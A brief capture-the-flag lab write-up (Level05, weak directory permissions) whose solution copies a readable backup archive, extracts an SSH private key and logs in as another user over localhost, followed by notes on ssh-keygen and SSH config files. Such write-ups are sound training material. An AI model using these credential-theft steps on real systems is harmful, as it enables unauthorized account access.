# Level05

#### About

Check the flag05 home directory. You are looking for weak directory permissions 
To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05. 


#### Source code

There is no source code available for this level


#### Solutions
```
ls -all /home/flag05/
ls -all /home/flag05/.backup/
cp /home/flag05/.backup/backup-19072011.tgz /tmp/
cd /tmp
tar xvf /tmp/backup-19072011.tgz
ssh -i /tmp/.ssh/id_rsa flag05@127.0.0.1
/bin/getflag
```

#### Recommends
ssh-keygen 
    ---- ssh-keygen -b 2048 -t rsa -C "this is my ssh key" -f ssh_key_file 
    ---- /etc/ssh/moduli 
    ---- /etc/ssh/ssh_config 
    ---- /etc/ssh/sshd_config 
    ---- /etc/ssh/ssh_host_ecdsa_key.pub 
    ---- /etc/ssh/ssh_import_id 
